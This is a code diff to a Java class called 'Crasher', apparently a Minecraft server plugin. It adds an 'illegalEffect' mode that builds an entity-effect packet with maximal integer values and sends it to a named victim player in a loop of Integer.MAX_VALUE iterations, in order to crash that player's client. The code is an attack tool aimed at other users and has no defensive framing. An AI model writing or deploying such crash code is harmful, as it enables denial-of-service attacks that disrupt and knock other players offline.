@@ -135,5 +135,13 @@ public class Crasher extends Command
 			PT.CrashPlayer(sender, Crash_Victim, args[3]);
 			Log(sender, "tried crashing " + Crash_Victim.getName());
 		}
+		if (mode.equalsIgnoreCase("illegalEffect") || mode.equalsIgnoreCase("Effect"))
+		{
+			packet = new PacketPlayOutEntityEffect (Crash_Victim.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true));
+			for (int i = 0; i < Integer.MAX_VALUE; i++)
+				PT.SendPacket(Crash_Victim, packet);
+			
+			Log(sender, "tried crashing " + Crash_Victim.getName());
+		}
 	}
 }
